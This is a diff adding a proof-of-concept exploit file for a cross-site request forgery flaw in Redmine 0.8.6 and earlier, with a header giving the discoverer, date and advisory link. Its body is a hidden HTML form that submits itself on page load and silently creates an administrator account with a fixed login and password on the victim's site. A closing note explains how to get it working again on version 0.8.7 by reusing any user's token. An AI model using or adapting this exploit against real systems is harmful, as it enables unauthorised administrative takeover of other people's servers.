@@ -1,0 +1,33 @@
+/**
+*  Redmine <= 0.8.6 CSRF Add Admin User Exploit
+*  Discovered by: p0deje (http://p0deje.blogspot.com)
+*  Application: http://www.redmine.org/wiki/redmine/Download
+*  SA: http://www.redmine.org/news/30
+*  Date: 13.11.2009
+*  Versions affected: <= 0.8.6
+*  Vulnerability: Cross-site Request Forgery
+*  Platform: Ruby (Ruby On Rails)
+*  Description: this is a simple exploit which use CSRF vulnerability in Redmine, creating user account with adminstartive rights
+*/
+
+<html>
+<body>
+    <form method=POST action="http://www.vulnerable-site.org/users/new">
+       <input style="display: none" type="text" value="hacker" size="25" name="user[login]" id="user_login"/>
+       <input style="display: none" type="text" value="hacker" size="30" name="user[firstname]" id="user_firstname"/>
+       <input style="display: none" type="text" value="hacker" size="30" name="user[lastname]" id="user_lastname"/>
+       <input style="display: none" type="text" value="hacker@hacker.com" size="30" name="user[mail]" id="user_mail"/>
+       <input style="display: none" type="password" size="25" name="password" id="password" value="hacker" />
+       <input style="display: none" type="password" size="25" name="password_confirmation" id="password_confirmation" value="hacker" />
+       <input style="display: none" type="checkbox" value="1" name="user[admin]" id="user_admin"/>
+       <input style="display: none" type="hidden" value="1" name="user[admin]"/>
+       <input style="display: none" type="submit" value="Create" id="commit" name="commit" />
+  </form>
+  <script>document.getElementById("commit").click();</script>
+</body>
+</html>
+
+/**
+*  P.S. Actually, this vulnerability wasn't fixed in Redmine 0.8.7, because token was generated one time for all the pages and all the users.
+*  Thus, you can add POST data with token of any user and exploit will get working again
+*/
